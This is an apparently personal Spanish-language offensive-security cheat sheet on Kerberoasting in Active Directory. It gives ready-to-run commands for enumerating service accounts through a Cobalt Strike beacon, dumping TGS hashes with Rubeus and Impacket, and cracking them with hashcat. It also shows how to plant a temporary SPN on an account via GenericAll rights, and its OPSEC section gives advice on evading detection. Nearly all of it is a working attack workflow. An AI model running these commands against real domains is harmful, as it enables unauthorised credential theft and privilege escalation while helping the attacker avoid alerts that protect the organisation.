---
tags: [ad, kerberos, kerberoasting, hashcat]
status: done
platform: windows
---

# Kerberoasting

> Solicitar TGS para cuentas de servicio (SPNs) y crackear el hash offline.

---

## Concepto

Los TGS para servicios con SPN están cifrados con la contraseña de la cuenta de servicio (hash NTLM). Sin necesitar privilegios especiales, cualquier usuario autenticado puede solicitar estos tickets y llevarlos offline para crackear.

---

## Enumeración (OPSEC — sin SharpHound)

```
# Buscar cuentas con SPN via ADSearch (BOF-based)
beacon> execute-assembly ADSearch.exe --search "(&(sAMAccountType=805306368)(servicePrincipalName=*))" --attributes cn,servicePrincipalName,sAMAccountName
```

---

## Explotación

### Windows — Rubeus
```
# Solicitar todos los TGS de cuentas kerberoasteables
Rubeus.exe kerberoast /outfile:hashes.txt /nowrap

# Target específico
Rubeus.exe kerberoast /user:svc-mssql /outfile:hashes.txt /nowrap
```

### Linux — Impacket
```bash
# Con credenciales
GetUserSPNs.py corp.local/usuario:password -dc-ip 10.10.10.10 -request -outputfile hashes.txt

# Con hash NTLM
GetUserSPNs.py corp.local/usuario -hashes :NTLM_HASH -dc-ip 10.10.10.10 -request
```

### Cobalt Strike (integrado)
```
beacon> execute-assembly Rubeus.exe kerberoast /outfile:hashes.txt /nowrap
```

---

## Cracking

```bash
# Hashcat — modo 13100 (RC4-HMAC/TGS-REP)
hashcat -a 0 -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt

# Con reglas
hashcat -a 0 -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# AES (modo 19600/19700)
hashcat -a 0 -m 19600 hashes.txt wordlist.txt    # AES-128
hashcat -a 0 -m 19700 hashes.txt wordlist.txt    # AES-256
```

---

## Tip — GenericAll

Si tenemos `GenericAll` sobre una cuenta sin SPN, podemos **añadir** un SPN:

```powershell
Set-ADUser svc-target -ServicePrincipalNames @{Add="fake/service"}
# Kerberoastear
# Eliminar el SPN tras crackear
Set-ADUser svc-target -ServicePrincipalNames @{Remove="fake/service"}
```

---

## OPSEC

> ⚠️ Rubeus.exe genera peticiones TGS al DC — visible en tráfico Kerberos.
> Solicitar TGS de muchas cuentas en poco tiempo puede disparar alertas.
> Mejor: targetear solo cuentas de servicio con contraseñas potencialmente débiles (naming convention, cuenta antigua).

